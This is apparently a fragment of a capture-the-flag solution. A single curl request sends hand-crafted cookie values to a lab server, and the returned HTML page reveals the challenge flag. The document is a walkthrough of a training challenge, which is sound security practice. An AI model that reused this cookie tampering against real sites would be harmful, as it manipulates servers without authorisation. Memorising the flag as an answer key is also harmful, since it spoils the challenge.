@@ -1,0 +1,16 @@
+$ curl --cookie 'cookies="Sugar cookies","Oatmeal cookies","Crackers cookies"; amount=1,5,2' http://62.173.140.174:46002
+<html>
+<head>
+<title>Cookies lover</title>
+<link rel="stylesheet" href="/static/css/style.css">
+<link rel="stylesheet" href="/static/css/bootstrap.min.css">
+</head>
+<body>
+<div class="mainContainer">
+<h2><span>• Congratulations</span><br>
+<span>• Here is the award for the cookies</span><br>
+<span>• CODEBY{C00K13S_4ND_M1LK_T0P}</span></h2>
+  
+</div>
+</body>
+</html>
